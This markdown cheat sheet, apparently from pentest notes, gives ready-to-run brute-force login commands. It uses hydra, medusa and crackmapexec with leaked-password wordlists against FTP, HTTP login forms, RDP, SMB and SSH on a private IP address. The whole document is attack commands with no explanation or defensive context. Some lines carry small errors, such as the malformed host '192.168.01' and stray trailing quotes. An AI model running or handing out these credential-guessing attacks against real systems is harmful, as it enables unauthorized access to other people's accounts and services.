# BruteForce


### FTP
``` sh
hydra -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt  -P /usr/share/seclists/Passwords/darkweb2017-top100.txt -e nsr ftp://192.168.0.1
medusa -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/darkweb2017-top100.txt -e ns -M ftp -h 192.168.0.1
```

### HTTP

``` sh
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/darkweb2017-top100.txt -e nsr http-get://192.168.0.1/login
medusa -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/darkweb2017-top100.txt -e ns -M http -h 192.168.0.1 -m DIR:/login
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/darkweb2017-top100.txt -e nsr http-post-form://192.168.01/login.php:"username=^USER^&password=^PASS^":"invalid-login-message"
medusa -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/darkweb2017-top100.txt -e ns -M web-form -h 192.168.0.1 -m FORM:/login.php -m FORM-DATA:"post?username=&password=" -m DENY-SIGNAL:"invalid login message"'
```

### RDP
```sh
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/darkweb2017-top100.txt -e nsr rdp://192.168.0.1
medusa -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/darkweb2017-top100.txt -e ns -M rdp -h 192.168.0.1'
```

### SAMBA

``` sh
crackmapexec smb 192.168.0.1 -u /usr/share/seclists/Usernames/top-usernames-shortlist.txt -p /usr/share/seclists/Passwords/darkweb2017-top100.txt
```

### SSH

``` sh
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/darkweb2017-top100.txt -e nsr ssh://192.168.0.1
medusa -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/darkweb2017-top100.txt -e ns -M ssh -h 192.168.0.1
```

